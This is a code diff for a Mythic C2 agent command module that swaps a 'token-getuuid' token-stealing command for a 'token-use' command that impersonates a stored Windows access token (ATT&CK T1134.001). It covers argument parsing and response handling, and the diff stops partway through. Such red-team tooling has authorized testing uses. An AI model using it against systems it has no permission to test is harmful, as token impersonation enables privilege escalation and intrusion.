@@ -1,79 +1,82 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-from .Utils.u import *
+from mythic_container.PayloadBuilder import *
 
-class TokenUUIDArguments(TaskArguments):
+class TokenUseArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
-        self.args = []
+        self.args = [
+            CommandParameter(
+                name="id",
+                cli_name="id",
+                type=ParameterType.Number,
+                description="Token from Mythic table to use",
+                parameter_group_info=[ParameterGroupInfo(required=True)]
+            )
+        ]
 
     async def parse_arguments(self):
         if len(self.command_line) > 0:
             if self.command_line[0] == "{":
                 self.load_args_from_json_string(self.command_line)
             else:
-                try:
-                    parts = self.command_line.split()
-                except Exception as e:
-                    raise ValueError(f"Failed to parse command line: {str(e)}")
+                self.add_arg("id", int(self.command_line.strip()))
 
-class TokenUUIDCommand(CommandBase):
-    cmd = "token-getuuid"
+class TokenUseCommand(CommandBase):
+    cmd = "token-use"
     needs_admin = False
-    help_cmd = "token-getuuid"
-    description = "Steal an access token from a specified process and optionally use it"
+    help_cmd = "token-use [id]"
+    description = "Usa um token da tabela do Mythic no agente atual"
     version = 1
     author = "@Oblivion"
-    attackmapping = ["T1070", "T1485", "T1134"]
-    argument_class = TokenUUIDArguments
-    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
+    attackmapping = ["T1134.001"]
+    argument_class = TokenUseArguments
     attributes = CommandAttributes(
         supported_os=[SupportedOS.Windows],
         builtin=True,
     )
 
     async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
-        response = PTTaskCreateTaskingMessageResponse(
+        task.args.add_arg("action", "use")
+        task.args.add_arg("token_id", task.args.get_arg("id"))
+        
+        return PTTaskCreateTaskingMessageResponse(
             TaskID=task.Task.ID,
-            DisplayParams=f"",
+            DisplayParams=f"id: {task.args.get_arg('id')}",
             CommandName="token"
         )
-        
-        task.args.add_arg("action", "getuuid")
-        
-        return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         try:
             if not response:
                 return PTTaskProcessResponseMessageResponse(
                     TaskID=task.Task.ID,
-                    Success=True,
+                    Success=False,
+                    Error="Not response from agent",
                     Completed=True
                 )
             
-            raw_response = bytes.fromhex(response)
-            psr = Parser(raw_response, len(raw_response))
+            # A resposta deve ser apenas um booleano (true/false)
+            success = bool(response)
             
-            token_uuid = psr.Bytes()
-
-            token_message =  f"{token_uuid[1:].decode("utf-8", "ignore")}"
-
+            message = "Token impersonated" if success else "Failure to impersonate token"
+            
             await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                 TaskID=task.Task.ID,
-                Response=token_message
+                Response=message.encode()
             ))
 
             return PTTaskProcessResponseMessageResponse(
                 TaskID=task.Task.ID,
-                Success=True
+                Success=success,
+                Completed=True
             )
 
         except Exception as e:
-            error_msg = f"Error processing token steal response: {str(e)}"
+            error_msg = f"Error to process response: {str(e)}"
             await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                 TaskID=task.Task.ID,
-                Response=error_msg.encode('utf-8')
+                Response=error_msg.encode()
             ))
             return PTTaskProcessResponseMessageResponse(
                 TaskID=task.Task.ID,
